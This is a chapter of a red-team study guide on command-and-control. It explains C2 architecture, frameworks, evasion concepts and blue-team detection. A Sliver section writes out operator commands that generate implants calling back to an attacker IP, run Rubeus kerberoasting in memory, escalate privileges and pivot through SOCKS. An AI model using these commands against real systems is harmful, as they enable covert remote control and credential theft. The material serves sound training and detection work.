---
title: "15. Command and Control (C2)"
order: 15
part: "C2 & Cloud"
description: "What C2 is, design concepts, common frameworks, Sliver usage, payload delivery, evasion and blue-team detection."
---

## 15.1 What C2 is, why it exists

Command and Control (C2) establishes a persistent, centralized, and covert communication channel with compromised machines (each running an **implant/agent/beacon**). Managing reverse shells one by one does not scale; C2 manages many hosts from a single console and provides file transfer, command execution, credential harvesting, lateral movement, and pivoting. It is the backbone of red team operations and of real attackers (APT). For this reason the **detection** side matters as well.

Architectural components:

- **Team server / C2 server:** the central brain that operators connect to. It can run multi-operator (multiplayer).
- **Implant / beacon / agent:** the agent on the target. It periodically "calls back" to the server, receives commands, and returns results.
- **Listener:** the channel on the server that listens for incoming implant connections.

## 15.2 Core design concepts

| Concept | Meaning |
| --- | --- |
| **Stager vs stageless** | A stager is a small downloader that pulls the actual payload (stage) from the C2; stageless is a single complete implant (more stable, larger). |
| **Beacon (asynchronous) vs interactive** | A beacon connects at set intervals (low detection); interactive is a continuously open session (fast but noisy). |
| **Sleep + jitter** | Sleep = the beacon's call-back interval (e.g. 60 s); jitter = the randomness added to this interval (e.g. 20%). Used to break up the regular "heartbeat" traffic signature (beaconing) and make behavioral detection harder. |
| **Listener/channel types** | HTTP/HTTPS (most common, blends into normal web traffic), DNS (slow but almost always open/unmonitored), SMB named pipe (peer-to-peer inside the network; reaches a host with no internet access via a neighbor), TCP, mTLS, WireGuard. |
| **Redirector** | An intermediary server that hides the real C2 server. Traffic arrives at the redirector and is forwarded from there to the C2; if it is caught, the C2 IP is protected. It can be HTTP (Apache mod_rewrite/nginx), DNS, or CDN. |
| **Malleable C2 profile** | A template that makes beacon traffic resemble a legitimate application (e.g. a CDN's jQuery request) (a Cobalt Strike concept). Request/response headers, URIs, and User-Agent are customized. |
| **Domain fronting** | Hiding C2 traffic through a trusted CDN domain; a legitimate domain is in the TLS SNI, the real C2 in the Host header. Large providers mostly blocked it, a declining technique. |
| **P2P / SMB beacon** | Chained (named pipe) C2 to a host inside the network that has no internet egress, via a neighboring host that can reach the internet. |

## 15.3 Common C2 frameworks

| Framework | License / Language | Key feature |
| --- | --- | --- |
| **Metasploit / Meterpreter** | Open / Ruby | Training and testing standard; staged/stageless, post modules (see Section 7). |
| **Cobalt Strike** | Commercial (~$5k/year/operator) | Industry standard; Beacon, malleable C2 profiles, Aggressor script, the most mature. The most heavily signatured due to abuse. |
| **Sliver** (BishopFox) | Open / Go | mTLS/HTTP(S)/DNS/WireGuard, multi-operator, procedural implant generation, armory extensions. The main open alternative to Cobalt Strike. |
| **Mythic** | Open / modular | "C2 for building C2": agent, C2 profile, and payloads are plugins; requires flexibility. |
| **Havoc** | Open / C | Evasion-focused "Demon" agent (indirect syscall, PE-less), modern interface; small community. |
| **Empire / Starkiller** | Open (community fork) | PowerShell/Python agents; maintenance status variable. |
| **Brute Ratel (BRc4)** | Commercial | EDR-evasion focused; leaked versions were abused. |

**Note:** The open-source reference framework is **Sliver**. For malleable C2 profile and "industry standard," think **Cobalt Strike**. Modular/plugin architecture = **Mythic**.

## 15.4 Sliver: practical use

```
# Server setup and operator
./sliver-server                                   # server console
new-operator --name op1 --lhost 10.10.14.5 > op1.cfg   # multi-operator profile
multiplayer                                        # open operator connections
armory install all                                 # load extensions (Rubeus, Seatbelt, SharpHound, etc.)

# Open listener
mtls --lport 443
https --lport 443
http  --lport 80
dns --domains c2.example.com.

# Generate implant
generate --mtls 10.10.14.5:443 --os windows --arch amd64 --format exe --save /tmp/imp.exe
generate beacon --mtls 10.10.14.5:443 --os windows --seconds 60 --jitter 20 --format exe --save /tmp/b.exe
generate --http 10.10.14.5 --format shellcode --save /tmp/sc.bin      # to embed into loader
implants                                           # list generated ones

# Session / beacon management
sessions ; beacons ; use <id>
shell                                              # interactive shell (noisy)
execute whoami ; pwd ; ls ; download ; upload
execute-assembly /opt/Rubeus.exe kerberoast        # run a .NET tool in memory without writing to disk
getsystem ; getprivs ; make-token                  # privilege operations
screenshot ; psexec                               # ekran / yanal

# Pivot
pivots                                             # TCP/named-pipe pivot dinleyici
portfwd add --bind 3389 --remote 10.10.20.5:3389
socks5 start                                       # SOCKS proxy → internal network via proxychains
```

**Note:** `execute-assembly` and `sideload` run tools like Rubeus/Seatbelt/SharpHound in memory **without writing to disk**; this bypasses disk-based AV but can be caught by memory/AMSI/ETW telemetry.

## 15.5 Payload delivery methods (initial access)

- **Phishing attachment / macro:** Office macro, malicious document.
- **HTML smuggling:** the malicious file is built client-side in the browser with JavaScript; it does not pass the network gateway as a "file."
- **LNK / HTA / JS / CHM / ISO / ZIP:** various carriers; ISO/ZIP are used to bypass the **Mark-of-the-Web (MOTW)** warning on a downloaded file.
- **Living off trusted sites:** legitimizing C2/delivery traffic via trusted services like ngrok and Cloudflare Tunnel.

## 15.6 Defense evasion (concepts and limits)

The goal here is not to give a malicious evasion recipe, but to understand **how these techniques are detected** and what the Blue team will watch for.

- **AMSI (Antimalware Scan Interface):** a Windows interface that scans PowerShell/scripts and .NET loads with AV at runtime. Attackers try to disable it in memory. **Detection/Defense:** AMSI is itself a defense mechanism; PowerShell **Script Block Logging (Event ID 4104)**, the content AMSI forwards to the EDR, and signatures of known bypass strings catch it.
- **ETW (Event Tracing for Windows):** the telemetry pipeline; tampering with it (patching) blinds the EDR. **Detection:** sudden silence in ETW providers, ETW tamper detection.
- **EDR unhooking / indirect syscall:** bypassing user-mode EDR hooks. **Detection:** kernel callbacks, abnormal syscall sources, memory integrity.
- **AppLocker / WDAC bypass:** running code with allowed binaries, **LOLBAS** (Living Off the Land Binaries): `msbuild.exe`, `installutil.exe`, `regsvr32.exe` (Squiblydoo), `mshta.exe`, `rundll32.exe`. **Detection:** unusual parent/child process and network behavior of these binaries (e.g. `winword.exe → powershell.exe`).

## 15.7 C2 traffic detection (Blue team)

- **Beaconing analysis:** regularly spaced, fixed-size outbound connections (when jitter is low) are caught statistically (e.g. RITA, Zeek).
- **TLS fingerprint:** the client/server TLS handshake signature via **JA3/JA3S**; known C2 implants are recognized.
- **DNS anomaly:** long/numerous TXT/NULL queries, high-entropy subdomains = DNS tunnel/C2.
- **Sigma rules / Sysmon:** `execute-assembly` (CLR loading Event 4104/7), abnormal process tree, unsigned in-memory execution.
- **Network:** long-lived low-volume connections to unknown domains/IPs, self-signed certificate, unusual User-Agent.

**Common mistakes:**

- **sleep/jitter** = call interval + randomness for detection evasion; when jitter is high, beaconing analysis becomes harder.
- **Redirector** hides the C2 server; **malleable profile** makes traffic look legitimate; **domain fronting** goes through a trusted CDN (mostly blocked).
- **SMB (named pipe) beacon** provides peer-to-peer C2 to an internal host that has no internet egress.
- The reference framework is **Sliver**; with `execute-assembly`, Rubeus/Seatbelt run without writing to disk.
- Stager (small, downloads) vs stageless (single piece, stable). C2 detection: **JA3**, beaconing, DNS entropy, Event 4104.
